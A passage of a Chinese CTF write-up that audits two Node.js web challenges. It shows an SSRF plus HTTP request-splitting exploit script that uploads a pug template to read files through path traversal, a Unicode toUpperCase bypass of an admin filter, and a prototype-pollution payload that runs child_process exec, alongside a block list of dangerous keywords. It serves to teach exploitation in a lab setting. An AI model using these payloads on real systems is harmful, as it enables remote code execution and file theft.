file_name</span><br><span class="line">            <span class="keyword">if</span>(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    obj.msg = <span class="string">&quot;file type error&quot;</span>;</span><br><span class="line">                    res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj = &#123;</span><br><span class="line">                    msg: <span class="string">&#x27;upload success&#x27;</span>,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                obj.msg = <span class="string">&#x27;upload failed&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(<span class="built_in">JSON</span>.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.sendFile(path.join(__dirname + <span class="string">&#x27;/template/source.txt&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/core&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:8081/source?&#x27;</span> + q</span><br><span class="line">        <span class="built_in">console</span>.log(url)</span><br><span class="line">        <span class="keyword">var</span> trigger = blacklist(url);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.get(url, <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>) </span>&#123;</span><br><span class="line">                    resp.setEncoding(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    resp.on(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (err.code === <span class="string">&quot;ECONNRESET&quot;</span>) &#123;</span><br><span class="line">                     <span class="built_in">console</span>.log(<span class="string">&quot;Timeout occurs&quot;</span>);</span><br><span class="line">                     <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                         resps = chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">&quot;global&quot;</span>, <span class="string">&quot;process&quot;</span>,<span class="string">&quot;mainModule&quot;</span>,<span class="string">&quot;require&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;child_process&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;!&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">8081</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>通过审计发现存在以下功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#x2F;&#39; &#x2F;&#x2F;index</span><br><span class="line">post &#x2F;file_upload &#x2F;&#x2F;文件上传</span><br><span class="line">get &#x2F;source &#x2F;&#x2F;查看源码</span><br><span class="line">get &#x2F;core &#x2F;&#x2F;存在SSRF</span><br></pre></td></tr></table></figure><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>核心代码分析：</p><p>get /core 存在SSRF，对我们传入的q参数进行拼接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;localhost:8081&#x2F;source?&#39; + q</span><br></pre></td></tr></table></figure><p>然后通过<code>blacklist</code>函数进行验证，<code>blacklist</code>函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> evilwords = [<span class="string">&quot;global&quot;</span>, <span class="string">&quot;process&quot;</span>,<span class="string">&quot;mainModule&quot;</span>,<span class="string">&quot;require&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;child_process&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;!&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> arrayLen = evilwords.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrayLen; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> trigger = url.includes(evilwords[i]);</span><br><span class="line">        <span class="keyword">if</span> (trigger === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对敏感函数进行了过滤。</p><p>post /file_upload 是个文件上传的地方，需要满足以下条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.includes(&#39;127.0.0.1&#39;)</span><br></pre></td></tr></table></figure><p>首页还存在提示：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417203837.png" alt="image-20210417203836999"></p><p>存在SSRF+nodejs 想到了http拆分攻击，Node 版本为 8.12.0，存在漏洞，因此可以利用上传功能。</p><p>提示了pug，同时模板渲染采用的是pug引擎：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417204312.png" alt="image-20210417204312204"></p><p>看一下<a href="https://pugjs.org/zh-cn/language/includes.html"> pug 引擎文档：</a></p><p>从代码可以看到存在一个/template模板目录，存放着后缀为pug的模板文件，看下文档里边的包含语法，那么我们可以上传一个pug文件，pug文件里写入恶意的包含代码，包含我们要读的文件，在模板渲染的时候就会包含目标文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//- index.pug</span></span><br><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">  head</span><br><span class="line">    style</span><br><span class="line">      include style.css</span><br><span class="line">      </span><br></pre></td></tr></table></figure><p>思路就很明显了，因为限制了本地上传我们利用nodejs 的SSRF构造一个post请求，上传pug文件，包含读取任意文件。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>构造post请求，采用抓包的方法获取上传请求：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417205203.png" alt="image-20210417205203592"></p><p>直接上传会提示：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417205422.png" alt="image-20210417205421796"></p><p>构造exp：利用nodejs ssrf构造post请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-8</span><br><span class="line">import urllib.parse</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST &#x2F;file_upload HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------303312354614442</span><br><span class="line">Content-Length: 317</span><br><span class="line"></span><br><span class="line">-----------------------------303312354614442</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;v1sun.pug&quot;</span><br><span class="line">Content-Type: &#x2F;..&#x2F;template</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;- v1sun.pug</span><br><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">  head</span><br><span class="line">    style</span><br><span class="line">      include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br><span class="line">      </span><br><span class="line">-----------------------------303312354614442--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET &#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: close</span><br><span class="line">x:&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">payload &#x3D; payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)</span><br><span class="line">payload &#x3D; &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)</span><br><span class="line">#print(payload)</span><br><span class="line">#print (urllib.parse.quote(payload))</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;1b1aa7a2-6ecd-4a57-b9de-5bbebae5c2a0.node3.buuoj.cn&#x2F;core?q&#x3D;&#39;+ urllib.parse.quote(payload))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p><code>Content-Type</code>处存在一个小trick，利用nodejs的目录穿越，上传到模板目录：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417211406.png" alt="image-20210417211406073"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: &#x2F;..&#x2F;template</span><br></pre></td></tr></table></figure><p>同时要修改：<code>Connection: keep-alive</code> 以至于让我们的所有请求包含进去</p><p>上传后访问：<code>?action=v1sun</code> 查看源码就得到flag</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417210638.png" alt="image-20210417210637714"></p><h3 id="WEB-Ez-Express"><a href="#WEB-Ez-Express" class="headerlink" title="[WEB]Ez_Express"></a>[WEB]Ez_Express</h3><h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404212051710.png" alt="image-20210404212051710"></p><p>但是ADMIN注册不了，利用TEST注册登录后查看源码：TEST 123456</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/image-20210404212126997.png" alt="image-20210404212126997"></p><p>下载源码</p><h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>审计发现是nodejs：app.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> createError = <span class="built_in">require</span>(<span class="string">&#x27;http-errors&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> indexRouter = <span class="built_in">require</span>(<span class="string">&#x27;./routes/index&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="comment">// view engine setup</span></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.disable(<span class="string">&#x27;etag&#x27;</span>);</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json())</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">    secret: randomize(<span class="string">&#x27;aA0&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span></span><br><span class="line">&#125;))</span><br><span class="line">app.use(logger(<span class="string">&#x27;dev&#x27;</span>));</span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(cookieParser());</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">&#x27;/&#x27;</span>, indexRouter);</span><br><span class="line"></span><br><span class="line"><span class="comment">// catch 404 and forward to error handler</span></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  next(createError(<span class="number">404</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// error handler</span></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// set locals, only providing error in development</span></span><br><span class="line">  res.locals.message = err.message;</span><br><span class="line">  res.locals.error = req.app.get(<span class="string">&#x27;env&#x27;</span>) === <span class="string">&#x27;development&#x27;</span> ? err : &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render the error page</span></span><br><span class="line">  res.status(err.status || <span class="number">500</span>);</span><br><span class="line">  res.render(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = app;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>app.js没什么特别关注的点。</p><p>index.js：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.match(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">      <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.session.user)&#123;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.outputFunctionName=<span class="literal">undefined</span>;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.session.user.user&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.body.Submit==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(safeKeyword(req.body.userid))&#123;</span><br><span class="line">    res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">   &#125;</span><br><span class="line">    req.session.user=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.body.pwd,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.redirect(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.body.Submit==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.session.user)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123;</span><br><span class="line">      req.session.user.isLogin=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  res.redirect(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&#x27;/action&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(req.session.user.user!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; </span><br><span class="line">  req.session.user.data = clone(req.body);</span><br><span class="line">  res.end(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/info&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>看到了js原型链污染漏洞的标志性函数：<code>merge</code> 应该就是原型链污染了。</p><p>但是看到：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417215614.png" alt="image-20210417215614572"></p><p>ADMIN用户才可以触发<code>clone</code> 进而利用<code>merge</code>。但是限制了admin注册，看下注册登陆处：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417215956.png" alt="image-20210417215955907"></p><p>注册处会有验证，但是后边写入session的时候会经过<code>toUpperCase()</code>函数的处理，不由得想到了nodejs的大小写转换特性：</p><blockquote><p>对于toUpperCase():</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br></pre></td></tr></table></figure><p>对于toLowerCase():</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure><p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p></blockquote><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>可见我们要想得到<code>ADMIN</code> 可以注册<code>admın</code> 经过处理就得到<code>ADMIN</code>：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417220456.png" alt="image-20210417220456007"></p><p>成功登陆。接下来就是原型链污染，首先寻找污染参数，看到存在<code>outputFunctionName</code>，并且<code>res.outputFunctionName=undefined;</code>在index页面渲染，那么可以构造payload污染参数，通过info页面触发，因为不能回显，可以反弹shell或者写入到一个文件内然后访问：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417225149.png" alt="image-20210417225148836"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;: &quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;cat &#x2F;flag &gt; &#x2F;app&#x2F;public&#x2F;flag&#39;);var _tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>路径通过报错得到：</p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417224238.png" alt="image-20210417224237777"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417224605.png" alt="image-20210417224604692"></p><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210417224723.png" alt="image-20210417224723183"></p><p>然后访问/flag 得到flag。</p><h3 id="WEB-Easyphp"><a href="#WEB-Easyphp" class="headerlink" title="[WEB]Easyphp"></a>[WEB]Easyphp</h3><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" 